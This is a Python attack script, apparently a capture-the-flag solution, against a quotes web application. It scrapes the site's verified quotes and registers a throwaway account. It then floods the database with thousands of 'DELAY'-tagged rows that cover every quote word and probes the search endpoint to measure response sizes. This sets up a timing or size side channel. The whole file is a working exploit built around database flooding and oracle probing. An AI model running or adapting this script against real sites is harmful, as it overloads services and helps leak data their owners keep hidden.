#!/usr/bin/env python3
import json
import html
import os
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests


TARGET = os.environ.get("TARGET", "").rstrip("/")
ROWS_PER_GROUP = int(os.environ.get("ROWS_PER_GROUP", "3000"))
WORKERS = int(os.environ.get("FILL_WORKERS", "8"))

if not TARGET.startswith(("http://", "https://")):
    raise SystemExit("Set TARGET first")


def find_quotes_file():
    candidates = sorted(Path(".").rglob("quotes.json"))
    for path in candidates:
        try:
            value = json.loads(path.read_text(encoding="utf-8"))
        except Exception:
            continue
        if isinstance(value, list) and value and all(
            isinstance(item, str) for item in value
        ):
            return path, value
    return None, None


def download_verified_quotes():
    session = requests.Session()
    collected = []
    pattern = re.compile(
        r'<li>\s*<p class="quote">"(.*?)"</p>\s*'
        r'<span class="verified">',
        re.DOTALL,
    )
    for page in range(1, 31):
        response = session.get(
            f"{TARGET}/quotes",
            params={"page": page, "cb": time.time_ns()},
            timeout=15,
        )
        response.raise_for_status()
        found = [html.unescape(item) for item in pattern.findall(response.text)]
        if not found and collected:
            break
        collected.extend(found)
    if not collected:
        raise SystemExit("Could not extract verified quotes from /quotes")
    return Path("<downloaded-from-target>"), collected


quotes_path, original_quotes = find_quotes_file()
if original_quotes is None:
    print("[*] Local quotes.json not found; downloading verified quotes")
    quotes_path, original_quotes = download_verified_quotes()
forbidden = set("%<>/\\&`[]{}()|$")
words = sorted(
    {
        word
        for quote in original_quotes
        for word in quote.split()
        if word and not any(char in forbidden for char in word)
    }
)

# Keep each quote under the application's 2000-byte limit.
groups = []
current = []
current_length = 0
for word in words:
    added = len(word) + (1 if current else 0)
    if current and current_length + added > 1800:
        groups.append(current)
        current = []
        current_length = 0
    current.append(word)
    current_length += len(word) + (1 if len(current) > 1 else 0)
if current:
    groups.append(current)

run_id = time.time_ns()
username = f"fill{run_id}"
password = f"Fill{run_id}x"

bootstrap = requests.Session()
register = bootstrap.post(
    f"{TARGET}/register",
    data={"username": username, "password": password},
    allow_redirects=False,
    timeout=8,
)
login = bootstrap.post(
    f"{TARGET}/login",
    data={"username": username, "password": password},
    allow_redirects=False,
    timeout=8,
)
if "username" not in bootstrap.cookies:
    raise SystemExit(
        f"Login failed (register={register.status_code}, "
        f"login={login.status_code})"
    )

cookie_values = bootstrap.cookies.get_dict()
local_state = threading.local()


def worker_session():
    if not hasattr(local_state, "session"):
        session = requests.Session()
        session.cookies.update(cookie_values)
        local_state.session = session
    return local_state.session


def insert_quote(job):
    group_number, row_number, coverage = job
    value = f"DELAY{run_id}G{group_number}N{row_number} {coverage}"
    session = worker_session()
    last_error = "unknown"
    for retry in range(10):
        try:
            response = session.post(
                f"{TARGET}/api/quotes",
                data={"quote": value},
                timeout=15,
            )
            data = response.json()
            if response.ok and data.get("status") == "success":
                return True, group_number
            last_error = f"HTTP {response.status_code}: {response.text[:80]}"
        except Exception as error:
            last_error = f"{type(error).__name__}: {error}"
        time.sleep(0.04 * (retry + 1) + random.random() * 0.05)
    return False, last_error


jobs = []
for group_number, group in enumerate(groups):
    coverage = " ".join(group)
    for row_number in range(ROWS_PER_GROUP):
        jobs.append((group_number, row_number, coverage))

print(f"[+] Quotes file: {quotes_path}")
print(f"[+] Original quotes: {len(original_quotes)}")
print(f"[+] Usable generator words: {len(words)}")
print(f"[+] Coverage groups: {len(groups)}")
print(f"[+] Adding {len(jobs)} total rows using {WORKERS} workers")

success = 0
failures = []
with ThreadPoolExecutor(max_workers=WORKERS) as pool:
    futures = [pool.submit(insert_quote, job) for job in jobs]
    for completed, future in enumerate(as_completed(futures), start=1):
        ok, detail = future.result()
        if ok:
            success += 1
        else:
            failures.append(detail)
        if completed % 250 == 0 or completed == len(futures):
            print(
                f"[+] Completed {completed}/{len(futures)}; "
                f"added={success}; failed={len(failures)}"
            )

print(f"[+] Finished: added={success}, failed={len(failures)}")
if failures:
    print("[-] First failures:")
    for item in failures[:10]:
        print(f"    {item}")

probe_words = [group[0] for group in groups]
for probe in probe_words:
    response = bootstrap.get(
        f"{TARGET}/search",
        params={"query": probe, "cb": time.time_ns()},
        timeout=30,
    )
    print(f"[+] Probe {probe!r}: {len(response.content)} bytes")
